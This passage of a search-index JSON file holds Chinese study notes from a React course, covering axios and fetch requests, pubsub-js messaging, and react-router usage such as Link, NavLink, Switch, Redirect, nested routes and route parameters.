\u6280\u672f\u5b9e\u73b0\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#67-github-","title":"67 github\u641c\u7d22\u6848\u4f8b-\u9759\u6001\u7ec4\u4ef6","text":"<p>\u5e38\u7528\u7684\u56fa\u5b9a\u7684css\u6700\u597d\u653e\u5728 public \u4e2d\uff0c\u7136\u540e\u5728 HTML \u6a21\u677f\u4e2d\u63d2\u5165</p> <p>\u7ec4\u4ef6\u5355\u72ec\u7684 css \u53ef\u4ee5\u653e\u5728 src/css \u8def\u5f84\u4e0b\uff0c\u5728\u4e0d\u540c\u7ec4\u4ef6\u4e2d\u5f15\u5165</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#68-github-axios","title":"68 github\u641c\u7d22\u6848\u4f8b-axios\u53d1\u9001\u8bf7\u6c42","text":"<pre><code>// \u8fd9\u662f\u539f\u6765\u7684\u5199\u6cd5\uff0c\u4ee3\u7801\u53ef\u8bfb\u6027\u8f83\u5dee\naxios.get(url).then(res =&gt; {\n  console.log(res.data);\n  this.setState({ data: res.data });\n}, err =&gt; {\n  console.log(err);\n});\n\n// \u8fd9\u6837\u56de\u8c03\u51fd\u6570\u66f4\u6e05\u6670\uff0c\u63a8\u8350\u8fd9\u79cd\u5199\u6cd5\naxios.get(url).then(\n  res =&gt; {\n    console.log(res.data);\n    this.setState({\n      data: res.data\n    });\n  },\n  err =&gt; {\n    console.log(err);\n  },\n);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#69-github-","title":"69 github \u641c\u7d22\u6848\u4f8b-\u5c55\u793a\u6570\u636e","text":""},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#70-github","title":"70 github \u641c\u7d22\u6848\u4f8b","text":"<p>\u4e09\u76ee\u8fd0\u7b97\u6cd5\u53ef\u4ee5\u5d4c\u5957\u4f7f\u7528\u2014\u2014\u4f46\u662f\u8fd9\u6837\u53ef\u8bfb\u6027\u4e0d\u9ad8</p> <pre><code>&lt;div&gt;\n  {\n    isFirst ? &lt;div&gt;Welcome&lt;/div&gt; :\n    isLoading ? &lt;Loading/&gt; :\n    isError ? &lt;Error&gt; :\n    &lt;List/&gt;\n  }\n&lt;/div&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#71-pubsub","title":"71 \u6d88\u606f\u8ba2\u9605\u4e0e\u53d1\u5e03-pubsub","text":"<p>Pubsub-js \u662f\u4e00\u4e2a\u7b2c\u4e09\u65b9\u5e93\uff0cpublish-subscribe</p> <pre><code>npm install pubsub-js --save\n</code></pre> <pre><code>import PubSub from 'pubsub-js';\n\ncomponentDidMount() {\n  this.token = PubSub.subscribe('delete', function(message, data){\n    console.log(message, data); \n  });\n}\n\ncomponentWillUnmount() {\n  PubSub.unscribe(this.token);\n}\n\n// another component\nPubSub.publish('delete', data);\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#72-fetch","title":"72 fetch\u53d1\u9001\u8bf7\u6c42","text":"<p>JS \u5e95\u5c42\u901a\u8fc7 xhr \u6216\u8005 fetch \u53d1\u9001\u8bf7\u6c42\u3002jQuery \u548c axios \u90fd\u662f\u57fa\u4e8e xhr \u53d1\u9001\u8bf7\u6c42\u3002</p> <p>\u95ee\u9898\uff1a\u8001\u7248\u672c\u6d4f\u89c8\u5668\u4e0d\u652f\u6301\uff1b\u5b9e\u9645\u4e0a\u4f7f\u7528\u4e0d\u591a\uff08\u539f\u751fXHR\u4e66\u5199\u9ebb\u70e6\uff0caxios \u5df2\u7ecf\u5c01\u88c5\uff09\u3002</p> <p>fetch \u5173\u6ce8\u5206\u79bb\uff1a\u7b2c\u4e00\u6b65\u5148\u5224\u65ad\u670d\u52a1\u5668\u662f\u5426\u8fde\u63a5\uff0c\u7b2c\u4e8c\u6b65\u518d\u83b7\u53d6\u8fd4\u56de\u7684\u6570\u636e</p> <pre><code>fetch('/api1/search/users?q=test').then(\n  response =&gt; {\n    console.log('\u8fde\u63a5\u670d\u52a1\u5668\u6210\u529f');\n    // \u8fd9\u91cc\u7684\u8fd4\u56de\u503c\u662f Promise \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 then \u5904\u7406\n    return response.join();\n  },\n  error =&gt; {\n    console.log('\u8fde\u63a5\u670d\u52a1\u5668\u5931\u8d25');\n    return new Promise(() =&gt; {});\n  },\n).then(\n  response =&gt; {\n    console.log('\u83b7\u53d6\u6570\u636e\u6210\u529f')\n  },\n  error =&gt; {\n    console.log('\u83b7\u53d6\u6570\u636e\u5931\u8d25')\n  },\n);\n</code></pre> <p>\u4e0a\u9762\u8fd9\u6837\u5199\uff0c\u9700\u8981\u4f7f\u7528\u4e24\u4e2a error \u5904\u7406\u51fd\u6570\uff0c\u5b9e\u9645\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a\u66ff\u4ee3</p> <pre><code>fetch(api).then(\n  response =&gt; {\n    console.log('\u8fde\u63a5\u670d\u52a1\u5668\u6210\u529f');\n    return response.join();\n  },\n).then(\n  response =&gt; {\n    console.log('\u83b7\u53d6\u6570\u636e\u6210\u529f')\n  }\n).catch(\n  err =&gt; {\n    console.log(err);\n  }\n);\n</code></pre> <p>\u6216\u8005\u4f7f\u7528 await \u4f18\u5316</p> <pre><code>try {\n  const res = await fetch(api);\n  const data = await res.json();\n  console.log(data);\n} catch (err) {\n  console.log(err);\n}\n</code></pre> <p>\u6280\u672f\u5c42\u9762\uff0cXHR(axios, ajax) \u548c fetch \u662f\u72ec\u7acb\u7684\u6280\u672f</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#73-github","title":"73 \u603b\u7ed3github\u641c\u7d22\u6848\u4f8b","text":"<p>\u76f8\u5173\u77e5\u8bc6\u70b9\uff1a</p> <p>1\u3001\u8bbe\u8ba1\u72b6\u6001\u8981\u5168\u9762\uff1a\u4f8b\u5982\u4e00\u4e2a\u5217\u8868\uff0c\u9700\u8981\u8003\u8651\u521d\u59cb\u7684\u72b6\u51b5\uff08\u6b22\u8fce\u8bcd\uff09\uff0c\u7f51\u7edc\u8bf7\u6c42\u4e2d\u7684\u72b6\u6001\uff08loading\uff09\u6570\u636e\u52a0\u8f7d\u540e\u7684\u72b6\u6001\uff08\u5217\u8868\uff09\u6570\u636e\u4e3a\u7a7a\u7684\u72b6\u6001\uff08\u7a7a\u5217\u8868\uff0c\u8fd8\u662f\u6e32\u67d3\u6ca1\u6709\u6570\u636e\uff09\u3002\u5982\u679c\u6d89\u53ca\u7f51\u7edc\u8bf7\u6c42\uff0c\u8981\u8003\u8651\u6210\u529f\u540e\u7684\u56de\u8c03\u51fd\u6570\uff0c\u5931\u8d25\u540e\u7684\u56de\u8c03\u51fd\u6570\uff0c\u754c\u9762\u7684\u63d0\u793a\u7b49\u7b49\u3002</p> <p>2\u3001ES6 \u89e3\u6784\u8d4b\u503c\u7684\u91cd\u547d\u540d</p> <pre><code>let obj = {a: {b : 1}};\nconst { a } = obj;\nconst { a: { b } } = obj; // \u591a\u91cd\u5bf9\u8c61\u89e3\u6784\u8d4b\u503c\nconst { a: time } = obj; // \u89e3\u6784\u8d4b\u503c\u53d8\u91cf\u91cd\u547d\u540d\n</code></pre> <p>3\u3001\u6d88\u606f\u8ba2\u9605\u548c\u53d1\u5e03</p> <p>\u5148\u8ba2\u9605\u540e\u53d1\u5e03\uff1b\u9002\u5408\u4efb\u4f55\u7ec4\u4ef6\u4f20\u53c2\u901a\u4fe1\uff1b\u9700\u8981\u5728\u5378\u8f7d\u65f6\u53d6\u6d88\u8ba2\u9605</p> <p>\u8fd9\u91cc\u4ecb\u7ecd\u7684\u662f\u7b2c\u4e09\u65b9\u7684\u8ba2\u9605\uff0c\u5b9e\u9645\u9879\u76ee\u4e2d\u81ea\u5b9a\u4e49\u7684\u6d88\u606f\u8ba2\u9605\uff0c\u9700\u8981\u9010\u5c42\u4f20\u53c2\uff0c\u4f7f\u7528\u4e0d\u53d8</p> <p>4\u3001fetch \u53d1\u9001\u8bf7\u6c42\uff08\u5173\u6ce8\u5206\u79bb\u601d\u60f3\uff09</p> <p>fetch \u5b9e\u9645\u4f7f\u7528\u4e0d\u591a\uff0c\u4e86\u89e3\u5373\u53ef\uff0c\u5927\u90e8\u5206\u60c5\u51b5\u4f7f\u7528 axios</p> <p>axios \u8bbe\u8ba1\u57fa\u4e8e XHR \u539f\u7406\uff0c\u76f4\u63a5\u8fd4\u56de\u8bf7\u6c42\u7684\u6570\u636e\u3002fetch \u662f\u6d4f\u89c8\u5668\u539f\u751f\u7684\uff0c\u4e0d\u57fa\u4e8e XHR\uff0c\u5148\u5224\u65ad\u662f\u5426\u8fde\u901a\uff0c\u7136\u540e\u83b7\u53d6\u6570\u636e\u3002</p> <pre><code>try {\n  const res = await fetch(url); // \u5148\u5224\u65ad\u670d\u52a1\u5668\u662f\u5426\u8fde\u901a\n  const data = await response.json(); // \u7136\u540e\u4ece\u8fd4\u56de\u7684 Promise \u4e2d\u62ff\u5230\u6570\u636e\n  console.log(data);\n} catch (e) {\n  console.log(e);\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#react-router","title":"\u7b2c\u4e94\u7ae0 react-router","text":""},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#74-spa","title":"74 \u5bf9SPA\u5e94\u7528\u7684\u7406\u89e3","text":"<p>\u5355\u9875\u9762\u5e94\u7528\uff1b\u6574\u4e2a\u5e94\u7528\u53ea\u6709\u4e00\u4e2a\u5b8c\u6574\u7684\u9875\u9762\uff1b\u70b9\u51fb\u9875\u9762\u5185\u90e8\u7684\u8fde\u63a5\uff0c\u9875\u9762\u4e0d\u4f1a\u5237\u65b0\uff0c\u5185\u90e8\u5185\u5bb9\u66f4\u65b0\uff08\u4f7f\u7528 axios \u8bf7\u6c42\u83b7\u53d6\u6570\u636e\uff0c\u524d\u7aef\u5f02\u6b65\u5c55\u793a\uff09</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#75","title":"75 \u5bf9\u8def\u7531\u7684\u7406\u89e3","text":"<p>\u8def\u7531\uff1a\u6620\u5c04\u5173\u7cfb\uff08key-value\uff09\u6ee1\u8db3\u67d0\u4e2a\u8def\u7531\uff0c\u5c31\u663e\u793a\u67d0\u4e2a\u9875\u9762</p> <p>\u540e\u7aef\u8def\u7531\uff1a\u6839\u636e URL \u4e2d\u7684\u53c2\u6570\uff0c\u67e5\u627e\u5230\u5339\u914d\u7684\u8def\u7531\uff0c\u5904\u7406\u8bf7\u6c42\uff0c\u8fd4\u56de\u54cd\u5e94\u6570\u636e</p> <p>\u524d\u7aef\u8def\u7531\uff1a\u6839\u636e url \u4e2d\u7684\u53c2\u6570\uff0c\u754c\u9762\u5c55\u793a\u4e0d\u540c\u7684\u7ec4\u4ef6\uff1b\u5f53 URL \u53d8\u5316\u540e\uff0c\u524d\u7aef\u754c\u9762\u66f4\u65b0</p> <pre><code>&lt;Route path=\"/test\" component={Test}&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#76","title":"76 \u524d\u7aef\u8def\u7531\u539f\u7406","text":"<p>\u524d\u7aef\u8def\u7531\uff08react-router, history\uff09\uff0c\u662f\u57fa\u4e8e History \u5bf9\u8c61\uff0c\u8fdb\u884c pop push replace \u6808\u64cd\u4f5c</p> <pre><code>// \u5f15\u5165\u7b2c\u4e09\u65b9\u7684\u5e93\nlet history = History.createBrowserHistory(); // \u57fa\u4e8e History \u5bf9\u8c61\n// let history = History.createHashHistory(); // \u57fa\u4e8e Hash \n\nfunction push(path) {\n  history.push(path);\n  return false;\n}\n\nfunction replace(path) {\n  history.replace(path);\n}\n\nfunction back() {\n  history.goBack();\n}\n\nfunction forward() {\n  history.goForward();\n}\n\nhistory.listen((location) =&gt; {\n  console.log('request route path is changed', location);\n})\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#77","title":"77 \u8def\u7531\u7684\u57fa\u672c\u4f7f\u7528","text":"<p>react-router \u5206\u6210 web native \u7248\u672c\uff0c\u6211\u4eec\u4f7f\u7528 web \u524d\u7aef\u7248\u672c\uff08\u524d\u7aef\u8def\u7531\uff09</p> <p>path \u5bf9\u5e94\u7684 value \u662f\u7ec4\u4ef6 component\uff0c\u5bf9\u5e94\u754c\u9762\u5c55\u793a\u7684\u5185\u5bb9</p> <pre><code>npm install react-router-dom\n</code></pre> <pre><code>import { Link, BrowserRouter } from 'react-router-dom';\nimport { About, Home } from './component/';\n\nrender () {\n  return (\n    // \u8def\u7531\u94fe\u63a5\u5b9e\u73b0\u5207\u6362\u7ec4\u4ef6(\u8fd9\u91cc\u6700\u597d\u653e\u5728\u9876\u5c42\u7ec4\u4ef6)\n    &lt;BrowserRouter&gt;\n      &lt;Link to=\"/about\"&gt;\u5173\u4e8e\u6211\u4eec&lt;/Link&gt;\n      &lt;Link to=\"/home\"&gt;\u4e3b\u9875&lt;/Link&gt;\n    &lt;/BrowserRouter&gt;\n\n    // \u6ce8\u518c\u8def\u7531\n    &lt;Route path=\"/about\" component={About} /&gt;\n    &lt;Route path=\"/home\" component={Home} /&gt;\n  );\n}\n</code></pre> <p>\u6539\u8fdb\u540e\u7684\u9876\u5c42\u7ec4\u4ef6</p> <pre><code>import React from 'react';\nimport ReactDOM from 'react-dom';\nimport { BrowserRouter } form 'react-router-dom';\nimport App from './App';\n\nReactDOM.render(\n  &lt;BrowserRouter&gt;\n    &lt;App/&gt;\n  &lt;/BrowserRouter&gt;,\n  document.getElementById('root');\n)\n</code></pre> <p>\u603b\u7ed3\uff1a</p> <ul> <li> <p>APP \u5916\u90e8\u7edf\u4e00\u5305\u88f9\u4e00\u4e2a BrowserRouter \u548c HashRouter</p> </li> <li> <p>\u754c\u9762\u5bfc\u822a\u533a\uff0c\u4f7f\u7528 Link \u6807\u7b7e</p> </li> <li> <p>\u754c\u9762\u5185\u5bb9\u533a\uff0c\u4f7f\u7528 Route \u8fdb\u884c\u8def\u5f84\u5339\u914d</p> </li> </ul>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#78","title":"78 \u8def\u7531\u7ec4\u4ef6\u4e0e\u4e00\u822c\u7ec4\u4ef6","text":"<p>\u8def\u7531\u7ec4\u4ef6\u5185\u90e8\uff0c\u53ef\u4ee5\u6536\u5230\u7279\u6b8a\u7684 props</p> <pre><code>history\uff08history \u7684\u4e00\u4e2a\u5c5e\u6027\u5c31\u662f location\uff09\n  go\n  goback\n  goForward\n  push\n  replace\nlocation\n  pathname\n  search\n  state\nmatch\n  params\n  path\n  url\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#79-navlink","title":"79 NavLink\u7684\u4f7f\u7528","text":"<pre><code>&lt;NavLink activeClassName to=\"/about\"&gt;About Us&lt;/NavLink&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#80-navlink","title":"80 \u5c01\u88c5NavLink\u7ec4\u4ef6","text":"<p>navlink \u53ef\u4ee5\u5b9e\u73b0\u8def\u7531\u94fe\u63a5\u9ad8\u4eae\uff0c\u901a\u8fc7 activeClassName \u6307\u5b9a\u6837\u5f0f\u540d\u79f0</p> <p>\u6807\u7b7e\u4f53\u5185\u5bb9\u662f\u7279\u6b8a\u7684\u6807\u7b7e\u5c5e\u6027\uff08\u901a\u8fc7 this.props.children \u83b7\u53d6\u6807\u7b7e\u4f53\u5185\u5bb9\uff09</p> <pre><code>import React, { Component } from 'react';\nimport { NavLink } from 'react-router-dom';\n\nexport default class MyLink extends Component {\n  render() {\n    const { to } = this.props;\n    return (\n      &lt;NavLink\n        activeClassName=\"test\"\n        className=\"list-group-item\"\n        to={to}\n        {...this.props}\n      &gt;\n        {this.props.children}\n      &lt;/NavLink&gt;\n    );\n  }\n}\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#81-switch","title":"81 Switch\u7684\u4f7f\u7528","text":"<p>\u901a\u5e38\u60c5\u51b5\u4e0b\uff0cpath \u548c component \u662f\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u5982\u679c\u6709\u76f8\u540c\u7684 path \u540e\u9762\u4f1a\u8986\u76d6\u524d\u9762</p> <p>\u5982\u679c\u662f switch \u5d4c\u5957\u7684\u8def\u7531\uff0c\u90a3\u4e48\u4f18\u5148\u5339\u914d\uff0c\u627e\u5230\u6ee1\u8db3\u7684\u5c31\u4e0d\u7ee7\u7eed\u5339\u914d\u4e86\uff0c\u63d0\u9ad8\u6548\u7387</p> <pre><code>&lt;Switch&gt;\n  &lt;Route path=\"/to\" component={About}/&gt;\n  &lt;Route path=\"/to\" component={My}/&gt;\n&lt;/Switch&gt;\n</code></pre> <p>\u5b9e\u9645\u9879\u76ee\u4e2d\uff0c\u901a\u5e38\u4e0d\u4f1a\u5199\u4e24\u4e2a\u76f8\u540c\u7684 path</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#82","title":"82 \u89e3\u51b3\u6837\u5f0f\u4e22\u5931\u95ee\u9898","text":"<p>\u5f00\u53d1\u4e2d\uff0c\u53ef\u80fd\u516c\u5171\u6837\u5f0f\u4e22\u5931\uff08bootstrap \u6837\u5f0f\u5f15\u5165\u65e0\u6548\uff09\u6216\u8005\u5176\u4ed6\u9759\u6001\u8d44\u6e90\u5f15\u5165\u4e0d\u6b63\u5e38</p> <p>\u68c0\u67e5\u5f15\u5165\u7684\u8def\u5f84</p> <pre><code>&lt;link rel='icon' href=\"%PUBLIC_URL%/favicon.ico\" /&gt;\n&lt;link rel=\"stylesheet\" href=\"./css/bootstrap.css\" /&gt;\n\n// \u4f7f\u7528\u9879\u76ee\u8def\u5f84\u4ee3\u66ff\u76f8\u5bf9\u8def\u5f84\n&lt;link rel=\"stylesheet\" href=\"%PUBLIC_URL%/bootstrap.css\" /&gt;\n</code></pre> <p>\u4e0d\u8981\u5199 ./ \u76f8\u5bf9\u8def\u5f84\uff0c\u53ef\u4ee5\u5199 / \u4ece\u6839\u76ee\u5f55\u4e2d\u5f15\u5165\uff0c\u6216\u8005 %PUBLIC_URL% \u8868\u793a\u516c\u5171\u8def\u5f84</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#83","title":"83 \u8def\u7531\u7684\u6a21\u7cca\u5339\u914d\u4e0e\u4e25\u683c\u5339\u914d","text":"<p>\u9ed8\u8ba4\u8def\u7531\u662f\u6a21\u7cca\u5339\u914d\uff08\u4f8b\u5982\u7ec4\u4ef6 /about \u53ef\u4ee5\u5339\u914d\u8def\u7531\u94fe\u63a5 /about/us/\uff09\u987a\u5e8f\u9700\u8981\u4e00\u81f4</p> <p>\u4e25\u683c\u5339\u914d\uff1a exact={true} \u5fc5\u987b\u4e25\u683c\u5339\u914d\uff0c\u901a\u5e38\u4e0d\u9700\u8981\uff08\u53ef\u80fd\u9020\u6210\u4e8c\u7ea7\u8def\u7531\u5931\u6548\uff09</p> <pre><code>&lt;Route exact={true} path=\"/about\" component={About} /&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#84-redirect","title":"84 Redirect\u7684\u4f7f\u7528","text":"<p>redirect \u8868\u793a\u91cd\u5b9a\u5411\uff0c\u901a\u5e38\u7528\u4e8e Switch \u7684\u65e0\u6548\u5339\u914d\u65f6\uff0c\u9ed8\u8ba4\u8df3\u8f6c\u7684\u9875\u9762</p> <p>\u5199\u5728\u8def\u7531\u6ce8\u518c\u6700\u4e0b\u65b9\uff0c\u5f53\u6240\u6709\u8def\u7531\u90fd\u65e0\u6cd5\u5339\u914d\u662f\uff0c\u8df3\u8f6c\u5230 redirect \u6307\u5b9a\u7684\u8def\u7531</p> <pre><code>&lt;Switch&gt;\n  &lt;Route path=\"/about\" componnet={About} /&gt;\n  &lt;Route path=\"/home\" component={Home} /&gt;\n  &lt;Redirect to=\"/about\" /&gt;\n&lt;/Switch&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#85","title":"85 \u5d4c\u5957\u8def\u7531","text":"<p>\u591a\u7ea7\u5bfc\u822a-\u591a\u7ea7\u8def\u7531\u5d4c\u5957</p> <pre><code>&lt;div&gt;\n  &lt;ul className=\"nav nav-tabs\"&gt;\n    &lt;li&gt;\n      &lt;MyNavLink to=\"/home/news\"&gt;\u65b0\u95fb&lt;/MyNavLink&gt;\n    &lt;/li&gt;\n    &lt;li&gt;\n      &lt;MyNavLink to=\"/home/message\"&gt;\u6d88\u606f&lt;/MyNavLink&gt;\n    &lt;/li&gt;\n  &lt;/ul&gt;\n  &lt;Switch&gt;\n    &lt;Route path=\"/home/news\" component={News} /&gt;\n    &lt;Route path=\"/home/message\" component={Message} /&gt;\n    &lt;Redirect to=\"/home/news\" /&gt;\n  &lt;/Switch&gt;\n&lt;/div&gt;\n</code></pre> <p>\u6ce8\u518c\u5b50\u8def\u7531\uff0c\u8981\u534f\u5546\u7236\u8def\u7531\u7684 path</p> <p>\u8def\u7531\u7684\u5339\u914d\u662f\u6309\u7167\u6ce8\u518c\u8def\u7531\u7684\u987a\u5e8f\u8fdb\u884c\u7684</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#86-params","title":"86 \u5411\u8def\u7531\u7ec4\u4ef6\u4f20\u9012params\u53c2\u6570","text":"<pre><code>&lt;Link to={`home/message/datail/${id}/${name}`} &gt;{title}&lt;/Link&gt;\n\n// \u58f0\u660e\u63a5\u6536 params \u53c2\u6570\n&lt;Route path=\"/home/message/detail/:id/:name\" component={Detail} /&gt;\n</code></pre> <p>\u5728\u5b50\u8def\u7531\u4e2d\u63a5\u6536\u53c2\u6570\uff08\u8fd9\u79cd\u53ef\u8bfb\u6027\u5f3a\uff0c\u4f7f\u7528\u6700\u591a\uff09</p> <pre><code>const { id, name } = this.props.match.params;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#87-search","title":"87 \u5411\u8def\u7531\u7ec4\u4ef6\u4f20\u9012search\u53c2\u6570","text":"<pre><code>&lt;Link to={`/home/message/detail/?id=${id}&amp;name=${name}`}&gt;{title}&lt;/Link&gt;\n</code></pre> <p>\u5b50\u7ec4\u4ef6\u4e2d\u63a5\u6536\u5230\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u89e3\u6790\u6210\u5bf9\u8c61</p> <pre><code>import qs from 'querystring';\n\nqs.stringify({name: 'Amy', age: 20});\nqs.parse('name=amy&amp;age=20');\n\nconst { search } = this.props.location;\nconst { id, name } = qs.parse(search.slice(1));\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#88-state","title":"88 \u5411\u8def\u7531\u7ec4\u4ef6\u4f20\u9012state\u53c2\u6570","text":"<p>\u8fd9\u6837\u754c\u9762\u7684\u8def\u7531\u4e2d\uff0c\u7528\u6237\u770b\u4e0d\u5230\u4f20\u9012\u7684\u53c2\u6570\u3002</p> <pre><code>&lt;Link to={{pathname: '/home/message/detail', state: {id: id, name: name}}}&gt;{title}&lt;/Link&gt;\n</code></pre> <p>\u5b50\u7ec4\u4ef6\u83b7\u53d6\u53c2\u6570</p> <pre><code>const { id, name } = this.props.location.state;\n</code></pre> <p>\u754c\u9762\u5237\u65b0\u540e\uff0c\u53ef\u4ee5\u4fdd\u7559\u53c2\u6570\uff08\u754c\u9762\u5f3a\u5236\u6e05\u7a7a\u7f13\u5b58\uff0c\u8fd9\u4e2a\u8fde\u63a5\u5c31\u65e0\u6548\u4e86\uff0c\u5b9e\u9645\u6280\u672f\u8fd8\u662f history \u5bf9\u8c61\uff09</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#89","title":"89 \u603b\u7ed3\u8def\u7531\u53c2\u6570","text":"<ul> <li> <p>Params\uff1a\u5728 URL \u4e2d\u643a\u5e26\u53c2\u6570\uff0c\u6ce8\u518c\u8def\u7531\u4f7f\u7528 :name \u63a5\u6536\u3002\u53c2\u6570 this.props.match.params \u4f7f\u7528\u6700\u591a</p> </li> <li> <p>Search: \u5728 ?key=value \u4e2d\u4f20\u53c2\u3002\u53c2\u6570\uff1athis.props.location.search\uff08string\uff09</p> </li> <li> <p>state \u53c2\u6570 \u5237\u65b0\u4e5f\u53ef\u4ee5\u4fdd\u7559\u53c2\u6570\uff0cthis.props.location.state</p> </li> </ul> <pre><code>&lt;Link to={`/home/${id}/${title}`}&gt;&lt;/Link&gt;\n\n&lt;Link to={`/home/?id=${id}&amp;title=${title}`}&gt;&lt;/Link&gt;\n\n&lt;Link replace={true} to={{pathname: '/home/message/detail', state; {id: id, title: title}}}&gt;&lt;/Link&gt;\n</code></pre>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#90-pushrepalce","title":"90 push\u4e0erepalce","text":"<p>\u901a\u8fc7 JS \u66f4\u6539 history \u5373\u53ef</p>"},{"location":"other/%E5%B0%9A%E7%A1%85%E8%B0%B7-React%E6%8A%80%E6%9C%AF%E5%85%A8%E5%AE%B6%E6%A1%B62021%E7%89%88%E7%AC%94%E8%AE%B001/#91","title":"91 \u7f16\u7a0b\u5f0f\u8def\u7531\u5bfc\u822a","text":"<p>\u4e4b\u524d\u7684\u6848\u4f8b\u90fd\u662f\u7528\u6237\u70b9\u51fb\u6309\u94ae\uff0c\u89e6\u53d1\u8def\u7531\uff0c\u6539\u53d8\u9875\u9762\u5185\u5bb9\u3002\u5982\u679c\u9700\u8981\u4f7f\u7528 JS \u89e6\u53d1\u8def\u7531\uff0c\u5c31\u9700\u8981\u4f7f\u7528\u76f8\u5173\u7684 API \u8fdb\u884c\u64cd\u4f5c\uff08\u4f8b\u5982\uff0c\u70b9\u51fb\u6309\u94ae\u540e\uff0c\u754c\u9762\u505c\u75593s\uff0c\u518d\u8df3\u8f6c\uff09\u3002</p> <p>\u539f\u7406\u5c31\u662f\u64cd\u4f5c BOM \u7684 history \u5bf9\u8c61</p> <pre><code>history.go()\nhistory.goBack()\nhistory.goForward()\n\nhistory.push()\nhistory.replace()\n</code></pre> 